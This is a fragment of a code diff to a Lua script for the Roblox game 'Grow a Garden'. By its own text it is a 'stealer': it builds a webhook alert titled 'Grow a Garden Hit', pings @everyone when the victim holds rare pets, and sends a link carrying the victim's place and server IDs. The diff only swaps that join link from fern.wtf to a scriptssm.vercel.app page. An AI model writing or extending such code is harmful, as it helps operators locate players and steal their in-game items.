@@ -418,7 +418,7 @@ end
             content = hasRarePets() and "@everyone\nTo activate the stealer you must jump or type in chat" or "To activate the stealer you must jump or type in chat",
             embeds = {{
                 title = "Grow a Garden Hit - Scripts.SM",
-                url = "https://fern.wtf/joiner?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId,
+                url = "https://scriptssm.vercel.app/joiner.html?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId,
                 color = 57855,
                 fields = {
                     {
@@ -478,7 +478,7 @@ end
                     },
                     {
                         name = "🔗 Join with URL",
-                        value = "[Click here to join](https://fern.wtf/joiner?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId .. ")",
+                        value = "[Click here to join](https://scriptssm.vercel.app/joiner.html?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId .. ")",
                         inline = false
                     }
                 },
